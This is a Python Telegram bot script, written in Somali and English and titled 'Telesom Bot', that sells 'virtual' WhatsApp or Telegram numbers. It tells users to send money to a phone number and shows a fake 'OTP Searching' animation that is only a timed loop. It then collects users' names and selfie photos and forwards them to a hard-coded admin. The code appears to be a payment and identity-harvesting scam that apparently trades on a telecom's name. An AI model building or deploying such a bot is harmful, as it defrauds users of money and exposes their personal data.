import os
import random
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
user_orders = {}
confirmed_codes = {}

# ===== STATES =====
class CodeState(StatesGroup):
    waiting_code = State()
    waiting_name = State()
    waiting_photo = State()

# ===== HELPERS =====
def generate_code():
    return "".join(random.choice("0123456789") for _ in range(6))

# ===== START =====
@dp.message(Command("start"))
async def start(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CODE CHECK", callback_data="code_check")]
    ])
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")]
    ])
    await call.message.edit_text("Dooro Adeeg:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp", "telegram"]))
async def service_selected(call: CallbackQuery):
    service = call.data

    user_orders[call.from_user.id] = {
        "service": service,
        "paid": False
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_payment")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel_payment")]
    ])

    await call.message.edit_text(
        "💵 Fadlan lacag ku dir:\n+252907868526\n\nKadib riix CONFIRM",
        reply_markup=kb
    )

@dp.callback_query(F.data == "cancel_payment")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

@dp.callback_query(F.data == "confirm_payment")
async def confirm_payment(call: CallbackQuery):
    msg = await call.message.edit_text("OTP Searching.")

    for i in range(5):
        await asyncio.sleep(1)
        dots = "." * ((i % 3) + 1)
        await msg.edit_text(f"OTP Searching{dots}")

    # generate code
    code = generate_code()
    confirmed_codes[call.from_user.id] = code

    # send admin request
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{call.from_user.id}")]
    ])

    await bot.send_message(
        ADMIN_ID,
        f"New Payment Request\nUser: {call.from_user.id}\nCode: {code}",
        reply_markup=kb
    )

    await asyncio.sleep(5)

    await call.message.answer("PLEASE SEND MONEY 💵")

# ===== ADMIN CONFIRM =====
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    user_id = int(call.data.split("_")[-1])
    code = confirmed_codes.get(user_id)

    await bot.send_message(user_id, f"Payment Confirmed ✅\nYour Code: {code}")
    await call.message.edit_text("Approved ✅")

# ===== CODE CHECK =====
@dp.callback_query(F.data == "code_check")
async def code_check(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Fadlan geli code kaaga:")
    await state.set_state(CodeState.waiting_code)

@dp.message(CodeState.waiting_code)
async def check_code(msg: Message, state: FSMContext):
    user_code = msg.text

    if user_code in confirmed_codes.values():
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="CARD 1", callback_data="card1")],
            [InlineKeyboardButton(text="CARD 2", callback_data="card2")],
            [InlineKeyboardButton(text="CARD 3", callback_data="card3")]
        ])
        await msg.answer("Dooro Card:", reply_markup=kb)
        await state.clear()
    else:
        await msg.answer("Code khalad ah ❌")

# ===== CARD SELECT =====
@dp.callback_query(F.data.in_(["card1","card2","card3"]))
async def card_select(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Magacaaga qor 3 jeer:")
    await state.set_state(CodeState.waiting_name)

@dp.message(CodeState.waiting_name)
async def get_name(msg: Message, state: FSMContext):
    await state.update_data(name=msg.text)
    await msg.answer("Fadlan sawirkaaga soo dir:")
    await state.set_state(CodeState.waiting_photo)

@dp.message(CodeState.waiting_photo, F.photo)
async def get_photo(msg: Message, state: FSMContext):
    data = await state.get_data()
    name = data.get("name")

    await bot.send_message(ADMIN_ID, f"User Card Request\nName:\n{name}")
    await bot.send_photo(ADMIN_ID, msg.photo[-1].file_id)

    await msg.answer("Request Sent To Admin ✅")
    await state.clear()

# ===== RUN =====
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
